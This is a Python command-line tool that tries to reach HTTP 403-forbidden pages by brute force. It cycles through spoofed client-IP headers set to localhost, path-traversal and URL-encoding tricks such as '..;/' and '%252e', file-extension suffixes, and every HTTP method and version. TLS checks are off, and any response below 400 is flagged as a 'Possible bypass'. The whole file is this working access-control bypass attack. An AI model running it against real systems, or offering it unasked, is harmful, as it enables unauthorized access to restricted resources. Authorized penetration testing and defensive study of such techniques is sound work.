#!/usr/bin/python3

import requests
import os
import sys
import signal
from http.client import HTTPConnection
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML&#44; like Gecko) Chrome/0.2.153.1 Safari/525.19"

versions = ["HTTP/1.1", "HTTP/1.0"]
Methods = ["get", "post", "head", "put", "delete", "connect", "options", "trace", "patch"]

IPHeaders = [
"Host",
"X-Custom-IP-Authorization",
"X-Forwarded-For",
"X-Forward-For",
"X-Remote-IP",
"X-Originating-IP",
"X-Remote-Addr",
"X-Client-IP",
"X-Real-IP",
"X-Requested-With",
"X-Request",
"X-True-IP",
"Forwarded-For",
"X-ProxyUser-Ip",
"True-Client-IP",
"Cluster-Client-IP",
"CF-Connecting-IP",
"Fastly-Client-IP",
"X-Host",
"X-Forwarded-Host",
"X-Forwarded-Proto",
"X-Forwarded-By"
]

Tweeks = [
"..",
".",
";",
"..;",
".;/",
"..;/",
"/.;/",
"/..;/",
"/../",
"/;/",
"//;//",
"/*",
"/*/",
"*",
"*/",
"/./",
"/.",
"./.",
"././",
".//.",
".//./",
"..//..",
"../..",
"../../",
"/./.",
"//.",
"//./",
"//",
"/.//./",
"/././",
"?",
"/?",
"/?/",
"~/",
"~/.",
"~//",
"~//.",
"~//./",
"~/..",
"~/../",
"%2f", 
"%252e", 
"%ef%bc%8f", 
"**/%252e**/", 
"_**/%252e**/"]

hosts = ["127.0.0.1", "localhost", "google.com"]
protocols = ["http://", "https://"]

#Not Yet Implemented URLHeaders = ["X-Original-URL","X-Rewrite-URL"]
#Not Yet Implemented MethodHeader = "X-HTTP-Method-Override"

Endings = [".css", ".html", ".json", ".php", "#", "%23", "%09", "%20"]

# "%00"

total = 0
reports = "\n\n\033[1;31;40mPossible bypass\033[1;37;40m:\n"

def banner():
    print(f"""                                                              
     @@@    @@@@@@@@   @@@@@@   @@@@@@@   @@@@@@@    @@@@@@   
    @@@@   @@@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
   @@!@!   @@!   @@@@      @@@  @@!  @@@  @@!  @@@  @@!  @@@  
  !@!!@!   !@!  @!@!@      @!@  !@!  @!@  !@!  @!@  !@!  @!@  
 @!! @!!   @!@ @! !@!  @!@!!@   @!@@!@!   @!@!!@!   @!@  !@!  
!!!  !@!   !@!!!  !!!  !!@!@!   !!@!!!    !!@!@!    !@!  !!!  
:!!:!:!!:  !!:!   !!!      !!:  !!:       !!: :!!   !!:  !!!  
!:::!!:::  :!:    !:!      :!:  :!:       :!:  !:!  :!:  !:!  
     :::   ::::::: ::  :: ::::   ::       ::   :::  ::::: ::  
     :::    : : :  :    : : :    :         :   : :   : :  :   
      \033[1;31;40mUsage:\033[1;37;40m {sys.argv[0]} http://path.to/forbidden/link\n\n   """)

def report(r, method, version, protocol, head, host, remains):
    global reports
    global total
    status = r.status_code
    total +=1
    if status < 400 :
        rep = (f'\nMethod: \033[1;34;40m{method}\033[1;37;40m\nCode: \033[1;34;40m  {str(r.status_code)}\033[1;37;40m\nLength: \033[1;34;40m{str(len(r.text))}\033[1;37;40m\nURL: \033[1;92;40m   {r.url}\033[1;37;40m\n')
        if rep in reports or r.status_code and str(len(r.text)) in reports:
            pass
        elif r.text != "":
            reports += str(rep+"\n")
    os.system('clear')
    banner()
    print(f"""
Total Requests:         \033[1;92;40m{total}\033[1;37;40m
Target:                 \033[1;34;40m{sys.argv[1]}\033[1;37;40m
Available Dirs:         \033[1;34;40m{sys.argv[1].split("/",3)[3]}\033[1;37;40m 


Fuzzing Method:         \033[1;92;40m{method}\033[1;37;40m
Version:                \033[1;92;40m{version}\033[1;37;40m
Protocol:               \033[1;92;40m{protocol}\033[1;37;40m
Headers:                \033[1;92;40m{head}:{host} \033[1;37;40m
                        \033[1;92;40mContent-Length:0\033[1;37;40m
User-Agent:             \033[1;92;40m{Agent}\033[1;37;40m


\033[1;31;40mProgress\033[1;37;40m:

Versions  Completed:    \033[1;34;40m{remains[1]}\033[1;37;40m
Protocols Completed:    \033[1;34;40m{remains[2]}\033[1;37;40m
Headers   Completed:    \033[1;34;40m{remains[3]}\033[1;37;40m
Hosts     Completed:    \033[1;34;40m{remains[4]}\033[1;37;40m
Methods   Completed:    \033[1;34;40m{remains[0]}\033[1;37;40m
Tweek     Rounds:       \033[1;34;40m{remains[6]}\033[1;37;40m
Ending    Rounds:       \033[1;34;40m{remains[7]}\033[1;37;40m

Now Trying:             \033[1;35;40m{method}\033[1;37;40m {r.url}

{reports}
""")



remains = []

def main(url):
    global remains
    if url[0:4] != "http":
        print("Include http:// or https:// in URL")
        sys.exit(0)
        
    if url.count("/") < 3:
        print("Check the URL that you provided.")
        sys.exit(0)

    if url[-1] != "/":
        url += "/"

    domain = url.split("/")[2] + "/"
    dils = []
    urldotsplit = url.split("/", 3)[3]
    dirs = urldotsplit.split("/")

    for i in range(len(dirs)):
        dils.append("/".join(dirs[:i])+ "/" + "+".join(dirs[i:]))

    dils.pop(-1)
    dils.reverse()
    try:
        dils.append(("+"+dils[-1][1:]))
    except IndexError:
        print("Check the URL that you provided.")

    remains.append("")
    remains.append("")
    remains.append("")
    remains.append("")
    remains.append("")
    remains.append("")
    remains.append("")
    remains.append("")


        
    for version in versions:
        remains[1] = str(versions.index(version)) + "/" + str(len(versions))
        HTTPConnection._http_vsn_str = version

        for protocol in protocols:
            remains[2] = str(protocols.index(protocol)) + "/" + str(len(protocols))

            for head in IPHeaders:
                remains[3] = str(IPHeaders.index(head)) + "/" + str(len(IPHeaders))

                for host in hosts:
                    remains[4] = str(hosts.index(host)) + "/" + str(len(hosts))
                    try:
                        for method in Methods:
                            remains[0] = str(Methods.index(method)) + "/" + str(len(Methods))

                            for i in range(len(dils)):
                                #remains[5] = str(dils.index(i)) + "/" + str(len(dils))
                                if dils[i][0]=="/":
                                    dils[i] = dils[i][1:]

                                for tweek in Tweeks:
                                    remains[6] = str(Tweeks.index(tweek)) + "/" + str(len(Tweeks))
                                    
                                    dirs = (dils[i].replace("+", tweek))

                                    for end in Endings:
                                        remains[7] = str(Endings.index(end)) + "/" + str(len(Endings))

                                        r=requests.request(method, protocol + domain + dirs , headers={"User-Agent": Agent, "Content-Length" : "0", head: host},  verify=False)
                                        report(r, method, version, protocol, head, host, remains)

                                        r=requests.request(method, protocol + domain  + dirs + end, headers={"User-Agent": Agent, "Content-Length" : "0", head: host},  verify=False)
                                        report(r, method, version, protocol, head, host, remains)


                                        if r.status_code == 501:
                                            print(f"Method {method} is not available. Skipping...\n")
                                            break
                                            

                    except requests.exceptions.SSLError as e:
                        print("SSLError: Possible Reason = https Not Available. Skipping...")
                        pass
                    except requests.exceptions.ConnectionError:
                        print("Connection Error: Possible Reason = Host is Down. Retrying...")
                        pass

def handler(signum, frame):
    res = input(f"trl+c was pressed. Do you really want to exit? \033[1;31;40my\033[1;37;40m/\033[1;34;40mn\033[1;37;40m ")
    if res == 'y' or res == 'yes':
        exit(1)
 
signal.signal(signal.SIGINT, handler)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        banner()
        sys.exit(0)
    main(sys.argv[1])
